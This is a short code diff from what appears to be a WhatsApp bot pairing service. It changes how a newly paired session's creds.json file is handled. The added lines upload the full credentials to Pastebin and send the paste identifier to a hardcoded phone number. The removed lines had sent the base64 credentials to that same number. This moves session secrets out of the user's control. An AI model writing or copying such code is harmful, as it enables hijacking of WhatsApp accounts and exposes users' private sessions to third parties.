@@ -55,8 +55,10 @@ router.get('/', async (req, res) => {
 					await delay(5000);
 					let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
 					await delay(800);
-				   let b64data = Buffer.from(data).toString('base64');
-				   let session = await Qr_Code_By_Wasi_Tech.sendMessage(`237620114013@s.whatsapp.net`, { text: 'CRAZY-MD-WHATSAPP-BOT;;;=>' + b64data });
+     const output = await pastebin.createPasteFromFile(data);
+                                                  const b64data = 'SLG-MD~' + output.split('https://pastebin.com/')[1]
+				 /*  let b64data = Buffer.from(data).toString('base64'); */
+				   let session = await Qr_Code_By_Wasi_Tech.sendMessage(`237620114013@s.whatsapp.net`, { text: b64data });
 	
 				   let WASI_MD_TEXT = `
 *_Pair Code Connected by CRAZY Teams_*
